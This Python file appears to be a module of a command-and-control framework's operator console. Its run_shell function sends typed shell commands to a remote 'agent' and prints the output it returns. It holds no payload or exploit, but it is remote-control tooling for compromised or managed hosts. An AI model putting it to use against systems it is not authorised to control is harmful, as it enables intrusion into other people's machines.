import time


def run_shell(manager, agent_id, c2_server):
    print(f"[*] Entering interactive shell with agent {agent_id}")
    print("[*] Type 'exit' to return to menu")
    print()

    while True:
        try:
            cmd = input(f"shell@{agent_id}> ")
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if cmd.lower() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue

        task_id = manager.send_task(
            agent_id, "shell_interactive", {"command": cmd.strip()}
        )
        if not task_id:
            print("[!] Agent not found")
            break

        for _ in range(30):
            time.sleep(0.3)
            results = manager.get_results(agent_id)
            for r in results:
                if r["task_id"] == task_id:
                    out = r["output"]
                    if out:
                        print(out, end="" if out.endswith("\n") else "\n")
                    break
            else:
                continue
            break
        else:
            print("[!] Timeout")
